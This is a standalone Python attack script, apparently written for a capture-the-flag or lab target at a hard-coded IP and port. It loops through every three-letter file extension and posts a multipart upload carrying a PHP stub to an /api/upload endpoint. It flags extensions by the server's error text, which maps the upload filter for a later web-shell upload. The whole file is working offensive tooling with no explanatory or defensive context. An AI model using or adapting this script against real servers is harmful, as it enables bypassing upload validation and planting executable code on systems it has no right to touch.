import requests
import string
import sys
from colorama import Fore
import asyncio
import aiohttp

url = "http://157.245.33.77:30525/api/upload"
data = '\r\n-----------------------------147370402711214034011022522944\r\n'
data += 'Content-Disposition: form-data; name="file"; filename="a.jpg"\r\n'
data += 'Content-Type: application/octet-stream\r\n\r\n'
data += '<?php ?> \r\n-----------------------------147370402711214034011022522944--'

headers = {'Content-Type': 'multipart/form-data; boundary=---------------------------147370402711214034011022522944'}
ext = "aaa"
letters = string.ascii_lowercase

def requesting():
	with requests.Session() as session:
		for letter1 in letters:
			for letter2 in letters:
				for letter3 in letters:
					ext = f"{letter1}{letter2}{letter3}"
					sys.stdout.write("\033[K")
					print(Fore.WHITE + f"Extension: {ext}", end='\r')
					data = '\r\n-----------------------------147370402711214034011022522944\r\n'
					data += f'Content-Disposition: form-data; name="file"; filename="a.{ext}"\r\n'
					data += 'Content-Type: application/octet-stream\r\n\r\n'
					data += '<?php ?> \r\n-----------------------------147370402711214034011022522944--'
					r = session.post(url, headers=headers, data=data)
					if (r.text.find("Something went wrong") != -1):
						sys.stdout.write("\033[K")
						print(Fore.GREEN + ext)
	
requesting()